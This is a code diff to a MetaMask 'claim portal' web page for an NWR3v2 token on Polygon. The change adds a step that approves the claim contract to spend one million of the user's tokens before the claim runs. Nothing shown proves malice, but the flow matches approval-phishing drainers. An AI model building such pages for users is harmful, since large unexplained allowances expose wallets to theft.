@@ -7,81 +7,94 @@
     body { background:#111; color:#afa; font-family:sans-serif; text-align:center; padding:50px; }
     button { padding:12px 24px; font-size:1rem; margin:10px; border:none; border-radius:6px; cursor:pointer; }
     #connect { background:#1E90FF; color:#fff; }
-    #claim   { background:#28a745; color:#fff; }
-    #status  { margin-top:20px; font-size:1.1rem; }
+    #approve { background:#FFA500; color:#fff; }
+    #claim { background:#28a745; color:#fff; }
+    #status { margin-top:20px; font-size:1.1rem; }
   </style>
 </head>
 <body>
   <h1>🚀 NWR3v2 Claim Portal</h1>
-  <button id="connect">Connect MetaMask</button><br>
+  <button id="connect">Connect MetaMask</button><br />
+  <button id="approve" disabled>⚙️ Approve Tokens</button>
   <button id="claim" disabled>💧 Claim Now</button>
   <div id="status"></div>
 
+  <!-- load ethers UMD v6 -->
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.9.0/dist/ethers.umd.min.js"></script>
-
   <script>
-    (async () => {
-      const CONTRACT_ADDRESS = "0xe830ebbDC2E201Dc1b3e96Fb3a0cbfd0e5215F48";
-      const ABI = ["function claim() external", "function lastClaim(address) view returns (uint256)"];
-      const connectBtn = document.getElementById("connect");
-      const claimBtn   = document.getElementById("claim");
-      const statusTxt  = document.getElementById("status");
+  // BEGIN ethers.js & UI setup
 
-      let provider, signer, contract;
+  const CONTRACT_ADDRESS = "0xe830ebbDC2E201Dc1b3e96Fb3a0cbfd0e5215F48";
+  const NWR3V2_TOKEN_ADDRESS = "0x65ca48d3D1d7356EC99cE6BD3736B54eFdfA837E";
+  const RPC_CHAIN_ID = 137; // Polygon Mainnet
+  const CLAIM_ABI = [
+    "function claimNWR3v2() external"
+  ];
+  const ERC20_ABI = [
+    "function approve(address spender, uint256 amount) external returns(bool)",
+    "function allowance(address owner, address spender) external view returns(uint256)",
+    "function decimals() external view returns(uint8)"
+  ];
 
-      connectBtn.onclick = async () => {
-        try {
-          if (!window.ethereum) throw new Error("MetaMask not found");
-          provider = new ethers.BrowserProvider(window.ethereum);
-          await provider.send("eth_requestAccounts", []);
-          signer = await provider.getSigner();
-          contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
-          connectBtn.disabled = true;
-          connectBtn.textContent = "✅ Connected";
-          claimBtn.disabled = false;
-          updateStatus();
-        } catch (err) {
-          statusTxt.textContent = "Connection error: " + (err.message || err);
-        }
-      };
+  let provider, signer;
+  let contract, tokenContract;
 
-      claimBtn.onclick = async () => {
-        if (!contract) return statusTxt.textContent = "Connect first!";
-        try {
-          claimBtn.disabled = true;
-          statusTxt.textContent = "⏳ Processing...";
-          const tx = await contract.claim();
-          await tx.wait();
-          statusTxt.textContent = "✅ Claimed successfully!";
-        } catch (err) {
-          statusTxt.textContent = "❌ Claim failed: " + (err.message || err);
-        } finally {
-          updateStatus();
-        }
-      };
+  const statusEl = document.getElementById("status");
+  const btnConnect = document.getElementById("connect");
+  const btnApprove = document.getElementById("approve");
+  const btnClaim = document.getElementById("claim");
 
-      async function updateStatus() {
-        if (!contract || !signer) return;
-        try {
-          const addr = await signer.getAddress();
-          const last = await contract.lastClaim(addr);
-          const elapsed = Math.floor(Date.now()/1000) - Number(last);
-          if (elapsed < 60) {
-            statusTxt.textContent = `Next claim in ~${60 - elapsed}s`;
-            claimBtn.disabled = true;
-          } else {
-            statusTxt.textContent = "You can claim now!";
-            claimBtn.disabled = false;
-          }
-        } catch (e) {
-          console.log(e);
-        }
+  btnConnect.onclick = async () => {
+    try {
+      await ethereum.request({ method: "eth_requestAccounts" });
+      const chainId = await ethereum.request({ method: "eth_chainId" });
+      if (parseInt(chainId, 16) !== RPC_CHAIN_ID) {
+        statusEl.innerText = "⚠️ Please switch to Polygon Mainnet.";
+        return;
       }
+      provider = new ethers.BrowserProvider(window.ethereum);
+      signer = await provider.getSigner();
+      contract = new ethers.Contract(CONTRACT_ADDRESS, CLAIM_ABI, signer);
+      tokenContract = new ethers.Contract(NWR3V2_TOKEN_ADDRESS, ERC20_ABI, signer);
+      btnApprove.disabled = false;
+      btnClaim.disabled = true;
+      statusEl.innerText = "✅ Connected to Polygon!";
+    } catch (err) {
+      console.error(err);
+      statusEl.innerText = "❌ Connection failed.";
+    }
+  };
 
-      setInterval(() => {
-        updateStatus();
-      }, 5000);
-    })();
+  btnApprove.onclick = async () => {
+    try {
+      statusEl.innerText = "⌛ Approving token allowance...";
+      const decimals = await tokenContract.decimals();
+      const amount = ethers.parseUnits("1000000", decimals); // 1 million allowance
+      const tx = await tokenContract.approve(CONTRACT_ADDRESS, amount);
+      await tx.wait();
+      statusEl.innerText = "✅ Approved! You can now claim.";
+      btnClaim.disabled = false;
+    } catch (err) {
+      console.error(err);
+      const msg = err.data?.message || err.message;
+      statusEl.innerText = `❌ Approval error: ${msg}`;
+    }
+  };
+
+  btnClaim.onclick = async () => {
+    try {
+      statusEl.innerText = "⌛ Submitting claim transaction...";
+      const tx = await contract.claimNWR3v2();
+      await tx.wait();
+      statusEl.innerText = "✅ Claim successful! 🚀";
+    } catch (err) {
+      console.error(err);
+      const msg = err.data?.message || err.message;
+      statusEl.innerText = `❌ Claim failed: ${msg}`;
+    }
+  };
+
+  // END ethers.js & UI setup
   </script>
 </body>
 </html>
